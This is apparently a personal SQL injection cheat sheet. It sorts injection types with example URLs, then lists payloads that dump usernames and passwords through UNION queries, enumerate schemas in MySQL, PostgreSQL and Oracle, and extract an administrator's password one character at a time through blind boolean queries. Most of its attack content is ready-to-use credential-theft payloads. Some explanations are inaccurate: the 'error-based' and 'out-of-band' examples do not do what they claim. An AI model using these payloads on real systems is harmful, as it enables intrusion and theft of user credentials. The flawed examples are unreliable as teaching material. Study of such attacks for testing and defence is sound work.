SQL Injection Types Overview
<hr>

1. In-band SQL Injection
> a. Error-based SQL Injection<br>
> > Method: GET
> >
> > Before Injection:
> >
> >     arduino
> >   	 http://example.com/login?username=admin&password=password
> > 
> >  After Injection:
> >
> >     vbnet
> >   	 http://example.com/login?username=admin'%20AND%201=1;--&password=password
> >
> INFO:
> > This injection attempts to generate an error message that can reveal database information.
> <hr>
>
> > b. Union-based SQL Injection
> >	Method: GET
> >
> > Before Injection:
> >
> >     arduino
> >      http://example.com/login?username=admin&password=password
> > After Injection:
> >
> >     vbnet
> >      http://example.com/login?username=admin'%20UNION%20SELECT%20username,%20password%20FROM%20users;--&password=password
> >
> INFO:
> > This injection combines results from the original query with results from another table.
> <hr>
<br>

2. Inferential SQL Injection (Blind SQL Injection)
>	a. Boolean-based Blind SQL Injection
> > Method: GET
> >
> > Before Injection:
> >
> >     arduino
> >      http://example.com/login?username=admin&password=password
> > After Injection:
> >
> >     bash
> >      http://example.com/login?username=admin'%20AND%20SUBSTRING(password,1,1)='a'--&password=password
> INFO:
> > The attacker infers whether the condition is true or false based on the application's response.
> <hr>
>
> b. Time-based Blind SQL Injection
> > Method: GET
> > Before Injection:
> >
> >     arduino
> >      http://example.com/login?username=admin&password=password
> > After Injection:
> >
> >     bash
> >      http://example.com/login?username=admin'%20AND%20IF(SUBSTRING(password,1,1)='p',SLEEP(5),0)--&password=password
> INFO:
> > The attacker uses a time delay to infer information based on how long the application takes to respond.
> <hr>
<br>

3. Out-of-band SQL Injection
> Method: GET (but typically relies on database features)<br>
> Before Injection:
>
>     arduino
>      http://example.com/login?username=admin&password=password
> After Injection:
>
>     vbnet
>      http://example.com/login?username='; SELECT COUNT(*) FROM users; --&password=password
> INFO:
> > This injection may not directly show results in the URL but relies on the database executing a command that sends data elsewhere (e.g., to an attacker-controlled server).
> <hr>
<br>

4. Second Order SQL Injection
> Method: GET or POST (commonly POST during registration)
> Before Injection:
>
>     arduino
>      http://example.com/register?username=johndoe&password=securepass
> After Injection:
>
>     sql
>      http://example.com/register?username=''); DROP TABLE users; --&password=securepass
> INFO:
> > This injection involves storing a payload that executes later when the application uses the stored data.
> <hr>
<br>

<hr>

Commonalit
> GET Requests: Easier to test directly through the URL, often used for retrieving data. Common for basic SQL injection testing.
>
> POST Requests: Used for submitting data, especially in forms like login or registration. While slightly more complex to test, they can be just as vulnerable.

<hr>

Conclusion
> While GET requests are more common for initial SQL injection testing due to their visibility in the URL, both GET and POST methods can be exploited. Understanding how each type works is crucial for identifying and mitigating SQL injection vulnerabilities. Always practice ethical testing and obtain permission before testing any application.

<hr>

WARNING
> Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

<hr>

Cheatsheet from portswigger:
	https://portswigger.net/web-security/sql-injection/cheat-sheet

<hr>

> using information_schema.tables to check table_name:
>
>     UNION SELECT table_name FROM information_schema.tables

<hr>

> using information_schema.columns to check column_name:
>
>     UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'

<hr>

> get values in username column from the users table:
>
>     SELECT username FROM users

<hr>

> get values in multiple column (username, password) from the users table:
>
>     SELECT username, password FROM users

<hr>

> get values in multiple column (username, password) from the users table with filter that cannot return more than one column:
>
>     UNION SELECT username || password FROM users -> usernamepassword

<hr>

> to split column username and password with symbols might easier to visualize:
> 
> >     UNION SELECT username || ':' || password FROM users -> username:password
> 
> >     UNION SELECT username || '~' || password FROM users -> username~password
> 
> >     UNION SELECT username || '@' || password FROM users -> username@password
> 
> >     UNION SELECT username || '-' || password FROM users -> username-password
> 
> >     UNION SELECT username || '+' || password FROM users -> username+password
> 
> >     UNION SELECT username || ',' || password FROM users -> username,password
> 
> >     UNION SELECT username || ';' || password FROM users -> username;password
> 
> >     UNION SELECT username || '|' || password FROM users -> username|password
> 
> >     UNION SELECT username || '_' || password FROM users -> username_password
> 
> >     UNION SELECT username || '>' || password FROM users -> username>password
> 
> >     UNION SELECT username || '\' || password FROM users -> username\password
> 
> >     UNION SELECT username || '/' || password FROM users -> username/password

<hr>

> to split column username and password with just space to have better visualization:
>
> >     UNION SELECT username || ' ' || password FROM users

<hr>

> to split with other ways like username: username & password: password:
>
> >     UNION SELECT 'username: ' || username || ' & password: ' || password FROM users

<hr>

> even better can try using AS formatted_output:
>
> >     UNION SELECT 'username: ' || username || ' & password: ' || password AS formatted_output FROM users

<hr>

injections with oracle built-in table:
> *notes: oracle must include FROM at least a table*
> *oracle built-in table 'dual' can be useful*
> example of using dual to get the database type and version:
> 
> >     ' UNION SELECT * FROM dual, v$version--

<hr>

> to query database type and version:
> >     +------------------+-------------------------+
> >     | Database type    | Query                   |
> >     +------------------+-------------------------+
> >     | Microsoft, MySQL | SELECT @@version        |
> >     | Oracle           | SELECT * FROM v$version |
> >     | PostgreSQL       | SELECT version()        |
> >     +------------------+-------------------------+
<hr>

> get all table in non oracle:
>
> > Show all table informations
> >
> >     SELECT * FROM information_schema.tables
>
> > Show only table names
> > 
> >     SELECT TABLE_NAME FROM information_schema.tables
>
> > In the case when the original query two column
> >
> >     SELECT TABLE_NAME,NULL FROM information_schema.tables

<hr>

> get all columns in non oracle:
>
> > Show all column informations
> >
> >     SELECT * FROM information_schema.columns WHERE table_name='table_name_value'
> 
> > Show only column name
> >
> >     SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='table_name_value'
> 
> > In the case when the original query two column
> >
> >     SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name='table_name_value'

<hr>

> get all tables in oracle:
>
> > Show all table informations
> >
> >     SELECT * FROM ALL_TABLES
> 
> > Show only table names
> >
> >     SELECT TABLE_NAME FROM ALL_TABLES
> 
> > In the case when the original query two column
> >
> >     SELECT TABLE_NAME,NULL FROM ALL_TABLES

<hr>

> get all columns in oracle:
>
> > show all column informations
> >
> >     SELECT * FROM ALL_TAB_COLUMNS WHERE table_name='table_name_value'
> 
> > Show only column name
> >
> >     SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE table_name='table_name_value'
> 
> > In the case when the original query two column
> >
> >     SELECT COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE table_name='table_name_value'

<hr>

> using ORDER by to check columns number:
>
> >     ' ORDER BY 1--
>
> >     ' ORDER BY 2--
>
> >     ' ORDER BY 3--
>
> *check with the errors returned*
> 
> example of error returned:
> > The ORDER BY position number 3 is out of range of the number of items in the select list.

<hr>

> using NULL to check columns number:
>
> >     ' UNION SELECT NULL --
>
> >     ' UNION SELECT NULL,NULL --
>
> >     ' UNION SELECT NULL,NULL,NULL --
> *check with the errors returned*
>
> example of error returned:
> > All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

<hr>

> use a data to check the column data type:
>
> >     ' UNION SELECT 'a',NULL,NULL,NULL--
>
> >     ' UNION SELECT NULL,'a',NULL,NULL--
>
> >     ' UNION SELECT NULL,NULL,'a',NULL--
>
> >     ' UNION SELECT NULL,NULL,NULL,'a'--
> *check data type error returned*
>
> example of error returned:
> > Conversion failed when converting the varchar value 'a' to data type int.

<hr>

> testing with substring / substr method:
>
> >     xyz' AND SUBSTRING ((SELECT Password FROM Users WHERE Username='administrator'),1,1) = 's
> the position of s is the test char and string
> *check the returned message like 'welcome back'*

<hr>

> testing with tracking id:
> example:
>
> > Original
> >
> >     trackingid=xyz;
>
> > Verify any returned message
> >
> >     trackingid=xyz' AND '1'='1
>
> > Verify no returned message
> >
> >     trackingid=xyz' AND '1'='2
>
> > Verify the table name users
> >
> >     trackingid=xyz' AND (SELECT 'a' FROM users LIMIT 1)=a'
>
> > Verify if the user administrator exists
> >
> >     trackingid=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a 
>
> > Verify the password length at the position 1
> >
> >     trackingid=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
>
> > Verify the password character at the position of the 2 in the example.
> >
> >     trackingid=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a 

<hr>

shortcut tool:
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
